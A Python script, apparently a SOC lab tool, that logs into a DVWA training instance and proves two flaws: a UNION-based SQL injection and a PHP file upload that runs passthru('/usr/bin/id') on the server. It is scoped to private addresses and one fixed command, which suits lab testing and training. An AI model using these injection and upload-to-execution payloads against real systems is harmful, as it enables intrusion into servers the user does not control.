"""Interactive Kali CLI for a fixed DVWA lab query and fixed harmless PHP probe."""
import argparse,getpass,hashlib,http.cookiejar,ipaddress,json,os,re,secrets,time
from html.parser import HTMLParser
from pathlib import Path
import urllib.parse,urllib.request

PHP=b"<?php header('Content-Type: text/plain'); echo 'SOC_LAB_FIXED_EXEC\\n'; passthru('/usr/bin/id'); ?>\n"
class Token(HTMLParser):
    def __init__(self):super().__init__();self.value=None
    def handle_starttag(self,tag,attrs):
        d=dict(attrs)
        if tag=='input' and d.get('name')=='user_token':self.value=d.get('value')


def run(target,action,username,password):
    ip=ipaddress.ip_address(target)
    if ip.version!=4 or not any(ip in ipaddress.ip_network(n) for n in ('10.0.0.0/8','172.16.0.0/12','192.168.0.0/16')):raise ValueError('RFC1918 lab target required')
    base='http://'+target+'/dvwa/'
    class LocalRedirect(urllib.request.HTTPRedirectHandler):
        def redirect_request(self,req,fp,code,msg,headers,newurl):
            u=urllib.parse.urlsplit(newurl)
            if u.scheme!='http' or u.netloc!=target or not u.path.startswith('/dvwa/'):raise ValueError('Out-of-scope redirect')
            return super().redirect_request(req,fp,code,msg,headers,newurl)
    jar=http.cookiejar.CookieJar();opener=urllib.request.build_opener(urllib.request.ProxyHandler({}),urllib.request.HTTPCookieProcessor(jar),LocalRedirect())
    def fetch(path,data=None,headers=None):
        with opener.open(urllib.request.Request(base+path,data=data,headers=headers or {}),timeout=6) as r:
            body=r.read(1024*1024+1)
            if len(body)>1024*1024:raise ValueError('Response too large')
            return body.decode(errors='replace')
    page=fetch('login.php');token=Token();token.feed(page)
    fields={'username':username,'password':password,'Login':'Login'}
    if token.value:fields['user_token']=token.value
    fetch('login.php',urllib.parse.urlencode(fields).encode())
    jar.set_cookie(http.cookiejar.Cookie(0,'security','low',None,False,target,False,False,'/',True,False,None,True,None,None,{},False))
    page=fetch('vulnerabilities/'+('sqli/' if action=='sqli' else 'upload/'))
    if 'login.php' in page and 'name="username"' in page:raise ValueError('DVWA login did not succeed')
    report={'format':'soc-dvwa-cli/0.1','action':action,'target':target,'started_at_epoch':time.time(),
        'instrumented_lab':True,'credentials_or_cookies_saved':False,'confirmed_general_compromise':False}
    if action=='sqli':
        baseline=fetch('vulnerabilities/sqli/?'+urllib.parse.urlencode({'id':'1','Submit':'Submit'}))
        query="1' UNION SELECT 'SOCLAB_UNION_PROOF','SOCLAB_SECOND_COLUMN'-- -"
        result=fetch('vulnerabilities/sqli/?'+urllib.parse.urlencode({'id':query,'Submit':'Submit'}))
        proof=bool(re.search(r'First name:\s*SOCLAB_UNION_PROOF\s*<',result) and re.search(r'Surname:\s*SOCLAB_SECOND_COLUMN\s*<',result))
        report.update(query_result_proof=proof,baseline_sha256=hashlib.sha256(baseline.encode()).hexdigest(),response_sha256=hashlib.sha256(result.encode()).hexdigest(),database_dump_performed=False)
        if not proof:raise ValueError('Fixed UNION result not verified. Check login/security/DVWA page; a 200/302 is insufficient')
    else:
        token=Token();token.feed(page);name='soc-lab-'+secrets.token_hex(16)+'.php';boundary='soc'+secrets.token_hex(16)
        fields={'MAX_FILE_SIZE':'100000','Upload':'Upload'}
        if token.value:fields['user_token']=token.value
        body=b''
        for key,value in fields.items():body+=('--'+boundary+'\r\nContent-Disposition: form-data; name="'+key+'"\r\n\r\n'+value+'\r\n').encode()
        body+=('--'+boundary+'\r\nContent-Disposition: form-data; name="uploaded"; filename="'+name+'"\r\nContent-Type: application/x-php\r\n\r\n').encode()+PHP+b'\r\n'+('--'+boundary+'--\r\n').encode()
        fetch('vulnerabilities/upload/',body,{'Content-Type':'multipart/form-data; boundary='+boundary})
        result=fetch('hackable/uploads/'+name)
        proof='SOC_LAB_FIXED_EXEC' in result and bool(re.search(r'uid=\d+\(',result)) and '<?php' not in result
        report.update(fixed_command='/usr/bin/id',fixed_execution_proof=proof,
            artifact_path='/opt/soc-lab/DVWA/hackable/uploads/'+name,
            artifact_sha256=hashlib.sha256(PHP).hexdigest(),response_sha256=hashlib.sha256(result.encode()).hexdigest(),
            scope='one fixed PHP id probe; no arbitrary command parameter, privilege escalation, persistence or reverse shell')
        if not proof:raise ValueError('Fixed PHP execution not verified')
    return report


def main():
    p=argparse.ArgumentParser(description=__doc__);p.add_argument('action',choices=('sqli','upload-fixed-probe'))
    p.add_argument('--target',default='172.20.0.3');p.add_argument('--username',default='admin');p.add_argument('--output',type=Path,required=True);a=p.parse_args()
    if a.output.exists():p.error('Choose a new report filename')
    password=getpass.getpass('DVWA password (lab default usually password): ')
    try:
        report=run(a.target,a.action,a.username,password)
        fd=os.open(a.output,os.O_WRONLY|os.O_CREAT|os.O_EXCL,0o600)
        with os.fdopen(fd,'w') as f:json.dump(report,f,indent=2)
        print(json.dumps(report,indent=2));return 0
    except (ValueError,OSError) as e:print('DVWA_TEST_INCOMPLETE:',e);return 2

if __name__=='__main__':raise SystemExit(main())
